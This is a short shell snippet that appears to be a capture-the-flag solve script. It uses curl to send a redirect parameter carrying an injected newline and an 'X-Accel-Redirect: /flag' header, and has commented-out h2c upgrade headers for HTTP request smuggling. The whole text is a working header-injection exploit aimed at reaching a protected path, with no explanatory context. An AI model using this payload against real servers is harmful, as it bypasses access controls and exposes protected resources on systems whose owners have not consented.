#curl -vvv -H "Upgrade: h2c" -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA" -H "Connection: Upgrade, HTTP2-Settings" "$1?redir=$(urlencode "https://google.com
curl -vvv "$1?redir=$(urlencode "https://google.com
X-Accel-Redirect: /flag")"

#Connection: Upgrade, HTTP2-Settings
#Upgrade: h2c
#HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
